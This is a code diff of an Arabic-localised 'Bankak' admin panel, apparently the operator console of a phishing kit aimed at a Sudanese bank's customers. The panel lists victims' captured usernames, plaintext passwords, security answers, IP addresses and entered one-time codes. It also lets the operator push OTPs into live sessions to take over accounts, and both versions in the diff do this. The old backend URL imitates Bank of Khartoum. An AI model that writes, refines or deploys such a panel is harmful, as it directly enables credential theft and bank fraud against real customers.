@@ -1,283 +1,252 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<meta name="mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-<meta name="apple-mobile-web-app-title" content="Bank Admin">
-<meta name="theme-color" content="#0A0A0F">
-<title>Admin Panel</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Panel | Bankak</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Inter',sans-serif;background:#0A0A0F;color:#fff;min-height:100vh}
-#login-screen{display:flex;align-items:center;justify-content:center;min-height:100vh}
-.login-card{background:#111118;border:1px solid #222;border-radius:20px;padding:40px;width:380px}
-.login-title{font-size:22px;font-weight:800;margin-bottom:6px}
-.login-sub{font-size:13px;color:#555;margin-bottom:28px}
-.field{background:#1A1A24;border:1.5px solid #222;border-radius:12px;padding:14px 16px;display:flex;align-items:center;gap:10px;margin-bottom:14px;transition:.2s}
-.field:focus-within{border-color:#3B7FFF44;background:#1C1C2E}
-.field input{flex:1;background:none;border:none;outline:none;color:#fff;font-size:15px;font-family:'Inter',sans-serif}
-.field input::placeholder{color:#333}
-.btn-login{width:100%;padding:15px;background:#3B7FFF;color:#fff;border:none;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;transition:.2s}
-.btn-login:hover{background:#2A6EEE}
-.err{color:#FF453A;font-size:13px;text-align:center;margin-top:10px;display:none}
-#admin-screen{display:none;min-height:100vh}
-.topbar{background:#111118;border-bottom:1px solid #1A1A26;padding:16px 28px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
-.topbar-left{display:flex;align-items:center;gap:12px}
-.topbar-logo{width:36px;height:36px;background:#1A2A4A;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px}
-.topbar-title{font-size:17px;font-weight:800}
-.topbar-sub{font-size:12px;color:#555;margin-top:1px}
-.topbar-right{display:flex;align-items:center;gap:10px}
-.badge{background:#1A1A24;border:1px solid #222;border-radius:8px;padding:6px 12px;font-size:12px;color:#888}
-.badge b{color:#fff}
-.btn-logout{background:none;border:1px solid #333;border-radius:8px;padding:7px 14px;color:#888;font-size:13px;cursor:pointer;font-family:'Inter',sans-serif;transition:.2s}
-.btn-logout:hover{border-color:#FF453A;color:#FF453A}
-.main{padding:24px 28px;max-width:1200px;margin:0 auto}
-.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:24px}
-.stat{background:#111118;border:1px solid #1A1A26;border-radius:14px;padding:18px 20px}
-.stat-label{font-size:12px;color:#555;margin-bottom:8px;text-transform:uppercase;letter-spacing:.5px}
-.stat-val{font-size:28px;font-weight:800}
-.stat-val.blue{color:#3B7FFF}
-.stat-val.yellow{color:#FF9F0A}
-.stat-val.green{color:#32D74B}
-.stat-val.red{color:#FF453A}
-.toolbar{display:flex;align-items:center;gap:10px;margin-bottom:16px}
-.toolbar-title{font-size:16px;font-weight:700;flex:1}
-.btn-refresh{background:#1A1A24;border:1px solid #222;border-radius:10px;padding:8px 16px;color:#888;font-size:13px;cursor:pointer;font-family:'Inter',sans-serif;transition:.2s;display:flex;align-items:center;gap:6px}
-.btn-refresh:hover{border-color:#3B7FFF;color:#3B7FFF}
-.btn-clear-all{background:#2B1414;border:1px solid #3B1A1A;border-radius:10px;padding:8px 16px;color:#FF453A;font-size:13px;cursor:pointer;font-family:'Inter',sans-serif;transition:.2s}
-.btn-clear-all:hover{background:#3B1A1A}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',sans-serif;background:#0f0f0f;color:#e0e0e0;min-height:100vh}
+.login-wrap{display:flex;align-items:center;justify-content:center;height:100vh}
+.login-box{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:40px;width:340px}
+.login-box h2{color:#f5c518;margin-bottom:24px;text-align:center;font-size:20px}
+.inp{width:100%;padding:12px 14px;background:#111;border:1px solid #444;border-radius:8px;color:#fff;font-size:14px;outline:none;margin-bottom:14px}
+.inp:focus{border-color:#f5c518}
+.btn{width:100%;padding:13px;background:#f5c518;border:none;border-radius:8px;color:#111;font-size:15px;font-weight:700;cursor:pointer}
+.btn:hover{background:#d4a818}
+.err{color:#ff5555;font-size:13px;margin-top:8px;text-align:center}
+#dashboard{display:none;padding:20px}
+.top-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;padding-bottom:16px;border-bottom:1px solid #333}
+.top-bar h1{color:#f5c518;font-size:18px}
+.btn-sm{padding:8px 16px;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:600}
+.btn-danger{background:#c0392b;color:#fff}
+.btn-logout{background:#333;color:#ccc}
+.btn-refresh{background:#2c3e50;color:#fff}
+.stats{display:flex;gap:12px;margin-bottom:20px;flex-wrap:wrap}
+.stat{background:#1a1a1a;border:1px solid #333;border-radius:10px;padding:16px 24px;text-align:center;flex:1;min-width:100px}
+.stat-num{font-size:28px;font-weight:700;color:#f5c518}
+.stat-lbl{font-size:12px;color:#888;margin-top:4px}
 .sessions{display:flex;flex-direction:column;gap:12px}
-.session-card{background:#111118;border:1px solid #1A1A26;border-radius:16px;padding:20px;transition:.2s}
-.session-card:hover{border-color:#2A2A3A}
-.session-card.otp_sent{border-color:#FF9F0A33}
-.session-card.verified{border-color:#32D74B33}
-.session-card.expired{opacity:.5}
-.sc-top{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:14px}
-.sc-id{font-size:18px;font-weight:800;margin-bottom:4px}
-.status-badge{padding:4px 10px;border-radius:6px;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.5px}
-.status-badge.pending{background:#1A1A2E;color:#3B7FFF}
-.status-badge.security_done{background:#1A1A2E;color:#9B7FFF}
-.status-badge.otp_sent{background:#2B1F00;color:#FF9F0A}
-.status-badge.verified{background:#0D2B1A;color:#32D74B}
-.status-badge.expired{background:#2B1414;color:#FF453A}
-.sc-data{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:16px}
-.data-item{background:#0A0A12;border-radius:10px;padding:10px 14px}
-.data-item .label{font-size:11px;color:#444;margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px}
-.data-item .value{font-size:13px;font-weight:600;direction:ltr;word-break:break-all}
-.data-item .value.pw{color:#FF9F0A}
-.data-item .value.otp-val{color:#32D74B;font-size:16px;letter-spacing:2px}
-.sc-actions{display:flex;gap:10px;align-items:center}
-.otp-input-wrap{flex:1;display:flex;gap:8px}
-.otp-input{background:#1A1A24;border:1.5px solid #222;border-radius:10px;padding:10px 14px;color:#fff;font-size:16px;font-family:'Inter',sans-serif;outline:none;flex:1;text-align:center;letter-spacing:3px;font-weight:700;transition:.2s}
-.otp-input:focus{border-color:#FF9F0A44;background:#1F1A10}
-.btn-send-otp{background:#FF9F0A;color:#000;border:none;border-radius:10px;padding:10px 20px;font-size:14px;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;white-space:nowrap;transition:.2s;display:flex;align-items:center;gap:6px}
-.btn-send-otp:hover{background:#FFB830}
-.btn-send-otp:disabled{opacity:.5;cursor:not-allowed}
-.btn-delete{background:#2B1414;border:1px solid #3B1A1A;border-radius:10px;padding:10px 14px;color:#FF453A;font-size:13px;cursor:pointer;font-family:'Inter',sans-serif;transition:.2s}
-.btn-delete:hover{background:#3B1A1A}
-.sc-time{font-size:11px;color:#333;margin-top:10px;direction:ltr}
-.empty-state{text-align:center;padding:80px 20px;color:#333}
-.empty-state .icon{font-size:48px;margin-bottom:16px}
-.empty-state p{font-size:15px}
-.toast{position:fixed;bottom:24px;right:24px;background:#1A2A1A;border:1px solid #32D74B44;border-radius:12px;padding:12px 20px;color:#32D74B;font-size:14px;font-weight:600;z-index:9999;opacity:0;transform:translateY(10px);transition:.3s;pointer-events:none}
-.toast.show{opacity:1;transform:translateY(0)}
-.toast.error{background:#2A1414;border-color:#FF453A44;color:#FF453A}
-@media(max-width:768px){
-  .stats{grid-template-columns:repeat(2,1fr)}
-  .sc-data{grid-template-columns:repeat(2,1fr)}
-  .main{padding:16px}
-  .topbar{padding:14px 16px}
-}
+.session-card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:10px;padding:16px;transition:border-color .2s}
+.session-card:hover{border-color:#444}
+.s-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px}
+.s-user{font-size:16px;font-weight:700;color:#fff}
+.s-pass{font-size:13px;color:#aaa;margin-top:2px;direction:ltr}
+.badge{display:inline-block;padding:3px 10px;border-radius:20px;font-size:11px;font-weight:700}
+.b-pending{background:#2c2c00;color:#f5c518}
+.b-security{background:#1a2a1a;color:#4caf50}
+.b-otp_sent{background:#1a1a3a;color:#64b5f6}
+.b-verified{background:#1a3a1a;color:#81c784}
+.b-expired{background:#2a1a1a;color:#e57373}
+.s-body{display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:13px;margin-bottom:12px}
+.s-row{background:#111;border-radius:6px;padding:8px 10px}
+.s-lbl{color:#888;font-size:11px;margin-bottom:2px}
+.s-val{color:#ddd;word-break:break-all;direction:ltr}
+.s-actions{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.otp-inp{padding:8px 12px;background:#111;border:1px solid #444;border-radius:6px;color:#fff;font-size:16px;font-family:monospace;width:120px;letter-spacing:3px;direction:ltr;outline:none}
+.otp-inp:focus{border-color:#f5c518}
+.btn-otp{padding:8px 16px;background:#1565c0;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:600}
+.btn-otp:hover{background:#1976d2}
+.btn-del{padding:8px 12px;background:#2a2a2a;color:#e57373;border:1px solid #3a3a3a;border-radius:6px;cursor:pointer;font-size:12px}
+.btn-del:hover{background:#3a2a2a}
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#333;color:#fff;padding:10px 24px;border-radius:8px;font-size:14px;display:none;z-index:999;border:1px solid #555}
+.empty{text-align:center;color:#555;padding:60px 20px;font-size:15px}
 </style>
 </head>
 <body>
 
-<div id="login-screen">
-  <div class="login-card">
-    <div class="login-title">🔐 Admin Panel</div>
-    <div class="login-sub">Bankak OTP Management</div>
-    <div class="field">
-      <input type="password" id="admin-pw" placeholder="Enter admin password"
-        onkeydown="if(event.key==='Enter')adminLogin()">
-    </div>
-    <button class="btn-login" onclick="adminLogin()">Login</button>
-    <div class="err" id="login-err">Wrong password. Try again.</div>
+<div class="login-wrap" id="login-page">
+  <div class="login-box">
+    <h2>لوحة تحكم بنكك</h2>
+    <input class="inp" type="password" id="admin-pass" placeholder="كلمة المرور" onkeydown="if(event.key==='Enter')doLogin()">
+    <button class="btn" onclick="doLogin()">دخول</button>
+    <div class="err" id="login-err"></div>
   </div>
 </div>
 
-<div id="admin-screen">
-  <div class="topbar">
-    <div class="topbar-left">
-      <div class="topbar-logo">🏦</div>
-      <div>
-        <div class="topbar-title">Bankak Admin Panel</div>
-        <div class="topbar-sub">OTP Management</div>
-      </div>
-    </div>
-    <div class="topbar-right">
-      <div class="badge">Last refresh: <b id="last-refresh">—</b></div>
-      <button class="btn-logout" onclick="adminLogout()">Logout</button>
+<div id="dashboard">
+  <div class="top-bar">
+    <h1>لوحة تحكم بنكك | Admin</h1>
+    <div style="display:flex;gap:8px">
+      <button class="btn-sm btn-refresh" onclick="loadSessions()">تحديث</button>
+      <button class="btn-sm btn-danger"  onclick="clearAll()">مسح الكل</button>
+      <button class="btn-sm btn-logout"  onclick="doLogout()">خروج</button>
     </div>
   </div>
-  <div class="main">
-    <div class="stats">
-      <div class="stat"><div class="stat-label">Total Sessions</div><div class="stat-val blue" id="stat-total">0</div></div>
-      <div class="stat"><div class="stat-label">Pending OTP</div><div class="stat-val yellow" id="stat-pending">0</div></div>
-      <div class="stat"><div class="stat-label">Verified</div><div class="stat-val green" id="stat-verified">0</div></div>
-      <div class="stat"><div class="stat-label">Expired</div><div class="stat-val red" id="stat-expired">0</div></div>
-    </div>
-    <div class="toolbar">
-      <div class="toolbar-title">Sessions</div>
-      <button class="btn-refresh" onclick="loadSessions()">🔄 Refresh</button>
-      <button class="btn-clear-all" onclick="clearAll()">🗑 Clear All</button>
-    </div>
-    <div class="sessions" id="sessions-list">
-      <div class="empty-state"><div class="icon">📭</div><p>No sessions yet</p></div>
-    </div>
+  <div class="stats">
+    <div class="stat"><div class="stat-num" id="st-total">0</div><div class="stat-lbl">إجمالي</div></div>
+    <div class="stat"><div class="stat-num" id="st-pending">0</div><div class="stat-lbl">انتظار</div></div>
+    <div class="stat"><div class="stat-num" id="st-otp">0</div><div class="stat-lbl">OTP أُرسل</div></div>
+    <div class="stat"><div class="stat-num" id="st-done">0</div><div class="stat-lbl">مكتمل</div></div>
   </div>
+  <div class="sessions" id="sessions-list"></div>
 </div>
 
 <div class="toast" id="toast"></div>
 
 <script>
-const API = 'https://bank-of-khartoum-bg6z.onrender.com';
-let adminToken = localStorage.getItem('bankakAdminToken') || '';
+// ← التغيير الوحيد: كان 'https://bank-of-khartoum.onrender.com'
+const API = '';
+let adminToken = null;
+let autoRefresh = null;
 
-if (adminToken) { showPanel(); }
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.style.display = 'block';
+  setTimeout(() => t.style.display = 'none', 2500);
+}
 
-async function adminLogin() {
-  const pw = document.getElementById('admin-pw').value;
+async function doLogin() {
+  const pass = document.getElementById('admin-pass').value;
   try {
     const r = await fetch(`${API}/api/admin/login`, {
       method: 'POST',
       headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({ password: pw })
+      body: JSON.stringify({ password: pass })
     });
     const d = await r.json();
-    if (d.success) {
+    if (d.token) {
       adminToken = d.token;
-      localStorage.setItem('bankakAdminToken', adminToken);
-      showPanel();
-    } else { showLoginError(); }
-  } catch(e) { showLoginError(); }
+      document.getElementById('login-page').style.display = 'none';
+      document.getElementById('dashboard').style.display  = 'block';
+      loadSessions();
+      autoRefresh = setInterval(loadSessions, 5000);
+    } else {
+      document.getElementById('login-err').textContent = 'كلمة المرور خاطئة';
+    }
+  } catch(e) {
+    document.getElementById('login-err').textContent = 'تعذّر الاتصال';
+  }
 }
 
-function showLoginError() {
-  document.getElementById('login-err').style.display = 'block';
-  setTimeout(() => document.getElementById('login-err').style.display = 'none', 3000);
-}
-
-function showPanel() {
-  document.getElementById('login-screen').style.display = 'none';
-  document.getElementById('admin-screen').style.display = 'block';
-  loadSessions(); // تحميل فوري عند الفتح
-  setInterval(loadSessions, 10000); // تحديث كل 10 ثواني
-}
-
-async function adminLogout() {
-  await fetch(`${API}/api/admin/logout`, { method: 'POST', headers: {'x-admin-token': adminToken} });
-  localStorage.removeItem('bankakAdminToken');
-  adminToken = '';
-  location.reload();
+async function doLogout() {
+  try {
+    await fetch(`${API}/api/admin/logout`, {
+      method: 'POST',
+      headers: {'x-admin-token': adminToken}
+    });
+  } catch(e) {}
+  clearInterval(autoRefresh);
+  adminToken = null;
+  document.getElementById('dashboard').style.display  = 'none';
+  document.getElementById('login-page').style.display = 'flex';
+  document.getElementById('admin-pass').value = '';
 }
 
 async function loadSessions() {
   try {
-    const r = await fetch(`${API}/api/admin/sessions`, { headers: {'x-admin-token': adminToken} });
-    if (r.status === 401) { adminLogout(); return; }
+    const r = await fetch(`${API}/api/admin/sessions`, {
+      headers: {'x-admin-token': adminToken}
+    });
     const sessions = await r.json();
     renderSessions(sessions);
-    document.getElementById('last-refresh').textContent = new Date().toLocaleTimeString();
-  } catch(e) { showToast('Connection error', true); }
+  } catch(e) {}
+}
+
+function statusBadge(s) {
+  const map = {
+    pending:'b-pending',
+    security_done:'b-security',
+    otp_sent:'b-otp_sent',
+    verified:'b-verified',
+    expired:'b-expired'
+  };
+  const labels = {
+    pending:'انتظار',
+    security_done:'أمان ✓',
+    otp_sent:'OTP أُرسل',
+    verified:'مكتمل ✓',
+    expired:'منتهي'
+  };
+  return `<span class="badge ${map[s]||'b-pending'}">${labels[s]||s}</span>`;
+}
+
+function timeAgo(iso) {
+  const diff = Math.floor((Date.now() - new Date(iso)) / 1000);
+  if (diff < 60)   return `${diff}ث`;
+  if (diff < 3600) return `${Math.floor(diff/60)}د`;
+  return `${Math.floor(diff/3600)}س`;
 }
 
 function renderSessions(sessions) {
-  document.getElementById('stat-total').textContent = sessions.length;
-  document.getElementById('stat-pending').textContent = sessions.filter(s=>s.status==='pending'||s.status==='otp_sent'||s.status==='security_done').length;
-  document.getElementById('stat-verified').textContent = sessions.filter(s=>s.status==='verified').length;
-  document.getElementById('stat-expired').textContent = sessions.filter(s=>s.status==='expired').length;
+  document.getElementById('st-total').textContent   = sessions.length;
+  document.getElementById('st-pending').textContent = sessions.filter(s=>s.status==='pending'||s.status==='security_done').length;
+  document.getElementById('st-otp').textContent     = sessions.filter(s=>s.status==='otp_sent').length;
+  document.getElementById('st-done').textContent    = sessions.filter(s=>s.status==='verified').length;
 
-  const container = document.getElementById('sessions-list');
+  const el = document.getElementById('sessions-list');
   if (!sessions.length) {
-    container.innerHTML = '<div class="empty-state"><div class="icon">📭</div><p>No sessions yet</p></div>';
+    el.innerHTML = '<div class="empty">لا توجد جلسات بعد</div>';
     return;
   }
-
-  container.innerHTML = sessions.map(s => {
-    const time = new Date(s.requestTime).toLocaleString();
-    const expires = new Date(s.expiresAt);
-    const remaining = Math.max(0, expires - Date.now());
-    const mins = Math.floor(remaining / 60000);
-    const secs = Math.floor((remaining % 60000) / 1000);
-    const timeLeft = remaining > 0 ? `${mins}:${secs.toString().padStart(2,'0')}` : 'Expired';
-    return `
-    <div class="session-card ${s.status}" id="card-${s.id}">
-      <div class="sc-top">
-        <div><div class="sc-id">${s.username || '—'}</div></div>
-        <span class="status-badge ${s.status}">${s.status.replace('_',' ')}</span>
-      </div>
-      <div class="sc-data">
-        <div class="data-item"><div class="label">Password</div><div class="value pw">${s.password || '—'}</div></div>
-        <div class="data-item"><div class="label">Security Question</div><div class="value" style="font-size:11px;color:#aaa">${s.secQuestion || '—'}</div></div>
-        <div class="data-item"><div class="label">Security Answer</div><div class="value pw">${s.secAnswer || '—'}</div></div>
-        <div class="data-item"><div class="label">Session Time Left</div><div class="value">${timeLeft}</div></div>
-        <div class="data-item"><div class="label">OTP Sent</div><div class="value otp-val">${s.otp || '—'}</div></div>
-        <div class="data-item"><div class="label">OTP Entered</div><div class="value otp-val">${s.enteredOtp || '—'}</div></div>
-        <div class="data-item"><div class="label">Verified At</div><div class="value">${s.verifiedTime ? new Date(s.verifiedTime).toLocaleTimeString() : '—'}</div></div>
-        <div class="data-item"><div class="label">IP</div><div class="value">${s.ip}</div></div>
-      </div>
-      ${s.status !== 'verified' && s.status !== 'expired' ? `
-      <div class="sc-actions">
-        <div class="otp-input-wrap">
-          <input class="otp-input" id="otp-${s.id}" type="text" maxlength="6" placeholder="000000">
-          <button class="btn-send-otp" onclick="sendOTP('${s.id}')">📤 Send OTP</button>
+  el.innerHTML = sessions.map(s => `
+    <div class="session-card" id="card-${s.id}">
+      <div class="s-head">
+        <div>
+          <div class="s-user">${s.username}</div>
+          <div class="s-pass">كلمة المرور: ${s.password}</div>
         </div>
-        <button class="btn-delete" onclick="deleteSession('${s.id}')">🗑</button>
-      </div>` : `
-      <div class="sc-actions">
-        <button class="btn-delete" onclick="deleteSession('${s.id}')">🗑 Delete</button>
-      </div>`}
-      <div class="sc-time">📅 ${time} &nbsp;|&nbsp; 🌐 ${s.ip}</div>
-    </div>`;
-  }).join('');
+        <div style="text-align:left">
+          ${statusBadge(s.status)}
+          <div style="font-size:11px;color:#666;margin-top:4px">${timeAgo(s.requestTime)}</div>
+        </div>
+      </div>
+      <div class="s-body">
+        ${s.secQuestion ? `
+          <div class="s-row"><div class="s-lbl">سؤال الأمان</div><div class="s-val">${s.secQuestion}</div></div>
+          <div class="s-row"><div class="s-lbl">الإجابة</div><div class="s-val">${s.secAnswer}</div></div>
+        ` : ''}
+        ${s.otp ? `<div class="s-row"><div class="s-lbl">OTP المرسل</div><div class="s-val" style="color:#64b5f6;font-size:18px;letter-spacing:3px">${s.otp}</div></div>` : ''}
+        ${s.enteredOtp ? `<div class="s-row"><div class="s-lbl">OTP المُدخل</div><div class="s-val" style="color:#81c784;font-size:18px;letter-spacing:3px">${s.enteredOtp}</div></div>` : ''}
+        <div class="s-row"><div class="s-lbl">IP</div><div class="s-val">${s.ip}</div></div>
+        <div class="s-row"><div class="s-lbl">الوقت</div><div class="s-val">${new Date(s.requestTime).toLocaleTimeString('ar')}</div></div>
+      </div>
+      <div class="s-actions">
+        <input class="otp-inp" type="text" id="otp-${s.id}" placeholder="OTP" maxlength="6" inputmode="numeric">
+        <button class="btn-otp" onclick="sendOtp('${s.id}')">إرسال OTP</button>
+        <button class="btn-del" onclick="deleteSession('${s.id}')">حذف</button>
+      </div>
+    </div>
+  `).join('');
 }
 
-async function sendOTP(sessionId) {
-  const input = document.getElementById(`otp-${sessionId}`);
-  const otp = input.value.trim();
-  if (otp.length < 4) { showToast('Enter a valid OTP', true); return; }
+async function sendOtp(id) {
+  const otp = document.getElementById(`otp-${id}`).value.trim();
+  if (!otp || otp.length < 4) { showToast('أدخل رمز OTP صحيح'); return; }
   try {
-    const r = await fetch(`${API}/api/admin/send-otp`, {
+    await fetch(`${API}/api/admin/send-otp`, {
       method: 'POST',
       headers: {'Content-Type':'application/json','x-admin-token':adminToken},
-      body: JSON.stringify({ sessionId, otp })
+      body: JSON.stringify({ sessionId: id, otp })
     });
-    const d = await r.json();
-    if (d.success) { showToast(`✅ OTP ${otp} sent!`); loadSessions(); }
-  } catch(e) { showToast('Error sending OTP', true); }
+    showToast(`تم إرسال OTP: ${otp}`);
+    loadSessions();
+  } catch(e) { showToast('خطأ في الإرسال'); }
 }
 
 async function deleteSession(id) {
-  if (!confirm('Delete this session?')) return;
-  await fetch(`${API}/api/admin/sessions/${id}`, { method: 'DELETE', headers: {'x-admin-token': adminToken} });
-  showToast('Session deleted'); loadSessions();
+  try {
+    await fetch(`${API}/api/admin/sessions/${id}`, {
+      method: 'DELETE',
+      headers: {'x-admin-token': adminToken}
+    });
+    document.getElementById(`card-${id}`)?.remove();
+    showToast('تم الحذف');
+    loadSessions();
+  } catch(e) {}
 }
 
 async function clearAll() {
-  if (!confirm('Delete ALL sessions?')) return;
-  await fetch(`${API}/api/admin/sessions`, { method: 'DELETE', headers: {'x-admin-token': adminToken} });
-  showToast('All sessions cleared'); loadSessions();
-}
-
-function showToast(msg, isError = false) {
-  const t = document.getElementById('toast');
-  t.textContent = msg;
-  t.className = 'toast show' + (isError ? ' error' : '');
-  setTimeout(() => t.className = 'toast', 3000);
+  if (!confirm('مسح كل الجلسات؟')) return;
+  try {
+    await fetch(`${API}/api/admin/sessions`, {
+      method: 'DELETE',
+      headers: {'x-admin-token': adminToken}
+    });
+    showToast('تم مسح الكل');
+    loadSessions();
+  } catch(e) {}
 }
 </script>
 </body>
